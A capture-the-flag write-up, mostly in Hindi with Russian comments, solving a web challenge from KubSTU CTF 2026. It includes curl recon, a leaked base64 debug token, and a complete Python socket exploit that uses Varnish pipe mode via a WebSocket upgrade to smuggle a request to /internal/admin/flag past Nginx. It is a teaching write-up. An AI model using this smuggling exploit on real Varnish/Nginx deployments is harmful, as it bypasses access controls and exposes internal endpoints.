# The Phantom Chat

> **श्रेणी:** Web · **इवेंट:** KubSTU CTF 2026 Autumn · **कठिनाई:** Hard

## 📌 कार्य

"Phantom Messenger" एक कॉर्पोरेट मैसेंजर है जिसकी बहु-परत वास्तुकला है: Varnish → Nginx → Backend। Nginx आंतरिक रूट्स की रक्षा करता है (`/internal/*` पर `deny all`), पर `/ws` पर एक WebSocket-upgrade Varnish को pipe mode में डाल देता है और सीधे बैकएंड तक एक कच्चा TCP-टनल खोल देता है। लक्ष्य है उस टनल के ज़रिए एक दूसरा HTTP-अनुरोध स्मगल करना, और Nginx को बायपास करते हुए `/internal/admin/flag` तक पहुँचना।

**फ़ाइलें:** [recon-headers.txt](../../../assets/Web/Phantom%20Chat/recon-headers.txt) · [ws-426-response.txt](../../../assets/Web/Phantom%20Chat/ws-426-response.txt) · [exploit-output.txt](../../../assets/Web/Phantom%20Chat/exploit-output.txt)

## 🏁 समाधान

### 1. एप्लिकेशन का अवलोकन

`http://CHALLENGE_HOST:35802` खोलने पर हमें एक कॉर्पोरेट मैसेंजर "Phantom Messenger" का लैंडिंग पेज दिखता है:

![Landing Page](../../../assets/Web/Phantom%20Chat/01-landing.png)

साइट एक पूर्ण उत्पाद जैसी दिखती है — रजिस्ट्रेशन, ऑथराइज़ेशन, चैनलों वाला चैट, Pricing, Docs, About पेज आदि सब कुछ है।

### 2. रजिस्ट्रेशन और लॉगिन

हम रजिस्टर करके मैसेंजर में प्रवेश करते हैं:

![Register](../../../assets/Web/Phantom%20Chat/02-register.png)

![Login](../../../assets/Web/Phantom%20Chat/03-login.png)

लॉगिन के बाद हम #general, #engineering, #devops आदि चैनलों वाले एक चैट में पहुँच जाते हैं। किसी भी स्पष्ट संकेत के बिना एक साधारण कॉर्पोरेट मैसेंजर।

### 3. टोह (Recon)

#### 3.1. HTTP-हेडर

हम प्रतिक्रिया के हेडरों के विश्लेषण से शुरू करते हैं:

```bash
$ curl -sI http://localhost:35802/
```

```
Server: nginx/1.25.5
Via: 1.1 fd54f2d70807 (Varnish/7.4)
X-Varnish: 29
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

**मुख्य खोजें:**
- `Via: 1.1 ... (Varnish/7.4)` — सामने Varnish है
- `Server: nginx/1.25.5` — Varnish के पीछे Nginx है

यह एक बहु-परत वास्तुकला है: **Varnish → Nginx → Backend**

#### 3.2. एंडपॉइंट्स खोजना

ब्रूट-फ़ोर्स से या `/api/info` के ज़रिए हम पाते हैं:

```bash
$ curl -s http://localhost:35802/api/info | python -m json.tool
```

```json
{
    "service": "phantom-messenger",
    "version": "2.1.0",
    "endpoints": {
        "channels": "/api/channels",
        "health": "/api/health",
        "info": "/api/info",
        "status": "/api/status"
    }
}
```

#### 3.3. WebSocket-एंडपॉइंट की खोज

dirsearch/ffuf के ज़रिए या चैट के JS के विश्लेषण से हम `/ws` पाते हैं:

```bash
$ curl -sI http://localhost:35802/ws \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 7"
```

```
HTTP/1.1 426 Upgrade Required
Server: Go-H2C
Sec-Websocket-Version: 13
X-Debug-Auth: UGhhbnRvbUJ5cGFzczIwMjY=
Content-Type: application/json
```

**गंभीर खोजें:**
1. `Server: Go-H2C` — बैकएंड Go में लिखा है (nginx में नहीं!)
2. **`X-Debug-Auth: UGhhbnRvbUJ5cGFzczIwMjY=`** — एक debug-हेडर का रिसाव!
3. `101` के बजाय `426` प्रतिक्रिया — WebSocket संस्करण अस्वीकृत किया गया
4. `Via` हेडर **अनुपस्थित** है — अनुरोध Nginx को बायपास करते हुए **सीधे** बैकएंड पर गया!

#### 3.4. टोकन डिकोड करना

```bash
$ echo "UGhhbnRvbUJ5cGFzczIwMjY=" | base64 -d
PhantomBypass2026
```

हमें टोकन मिला: `PhantomBypass2026`

### 4. भेद्यता को समझना

#### वास्तुकला:
```
Client → Varnish:6081 → Nginx:80 → Backend:5000
              ↓ (if Upgrade + /ws)
              └──── pipe ────→ Backend:5000 (напрямую, минуя Nginx!)
```

#### मुख्य अवलोकन:

1. `Upgrade: websocket` हेडर के साथ `/ws` पर अनुरोध करने पर — Varnish **pipe mode** में चला जाता है (सीधे बैकएंड तक एक कच्चा TCP-टनल)
2. बैकएंड `426` से उत्तर देता है (`101` से नहीं), पर **Varnish पहले से ही pipe mode में है** और प्रतिक्रिया की जाँच नहीं करता
3. TCP-कनेक्शन खुला रहता है — उसी कनेक्शन पर एक **दूसरा HTTP-अनुरोध** भेजा जा सकता है
4. यह अनुरोध सीधे बैकएंड पर जाएगा, Nginx और उसके ACL को **बायपास करते हुए**

#### Nginx क्या ब्लॉक करता है:
- `/internal/*` पर `deny all`
- `X-Internal-Token` हेडर को हटाना

#### हम क्या बायपास करते हैं:
smuggling के ज़रिए अनुरोध **सीधे** बैकएंड पर जाता है — Nginx उसे देखता ही नहीं!

### 5. एक्सप्लॉइटेशन

#### 5.1. WebSocket Smuggling (Python)

```python
import socket
import base64

host = "CHALLENGE_HOST"
port = 35802

# Шаг 1: WebSocket upgrade с невалидной версией
upgrade = (
    f"GET /ws HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    f"Sec-WebSocket-Version: 7\r\n"
    f"\r\n"
)

# Шаг 2: Smuggled запрос к internal endpoint
smuggled = (
    f"GET /internal/admin/flag HTTP/1.1\r\n"
    f"Host: localhost\r\n"
    f"X-Internal-Token: PhantomBypass2026\r\n"
    f"Connection: close\r\n"
    f"\r\n"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((host, port))

# Отправляем upgrade → Varnish входит в pipe mode
sock.sendall(upgrade.encode())

# Читаем 426 ответ (Varnish его пропускает, тоннель открыт)
response = b""
while b"\r\n\r\n" in response is False or len(response) < 10:
    chunk = sock.recv(4096)
    if not chunk: break
    response += chunk
    if b"\r\n\r\n" in response: break

print(response.decode())

# Отправляем smuggled запрос — идёт напрямую к бэкенду!
sock.sendall(smuggled.encode())

# Получаем флаг
flag_response = b""
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk: break
        flag_response += chunk
    except: break

print(flag_response.decode())
sock.close()
```

#### 5.2. एक्सप्लॉइट का आउटपुट

```
============================================================
  The Phantom Upgrade - WebSocket Smuggling Exploit
============================================================

[*] Connecting to localhost:35802
[*] Sending WebSocket Upgrade with invalid version (Sec-WebSocket-Version: 7)
[*] Reading 426 response from backend (Varnish stays in pipe mode)...
[*] Got response: HTTP/1.1 426 Upgrade Required
[+] Found token hint in X-Debug-Auth: PhantomBypass2026
[*] Tunnel is open! Sending smuggled request to /internal/admin/flag
[*] Reading flag response...

[+] Smuggled response:
HTTP/1.1 200 OK
Content-Type: application/json
Server: Go-H2C

{"flag":"KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}",
 "message":"Congratulations! You've mastered WebSocket smuggling through the Phantom Upgrade."}

[!!!] FLAG: KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}
```

### 6. हमले की संक्षिप्त शृंखला

```
1. Recon → обнаруживаем Varnish + Nginx по заголовкам
2. Находим /ws endpoint (dirsearch / JS analysis)
3. WebSocket handshake с Version:7 → 426 + X-Debug-Auth утечка
4. base64 decode → PhantomBypass2026
5. Понимаем: Varnish pipe mode → прямой тоннель к бэкенду
6. Smuggling: второй HTTP-запрос через открытый тоннель
7. GET /internal/admin/flag + X-Internal-Token → FLAG!
```

### 7. फ़्लैग

```
KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}
```

### स्रोत

- [WebSocket Smuggling](https://www.intruder.io/research/practical-http-header-smuggling)
- [Varnish pipe mode documentation](https://varnish-cache.org/docs/trunk/users-guide/vcl-built-in-subs.html)
- [RFC 6455 — The WebSocket Protocol](https://tools.ietf.org/html/rfc6455)

**फ्लैग:** `KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}`
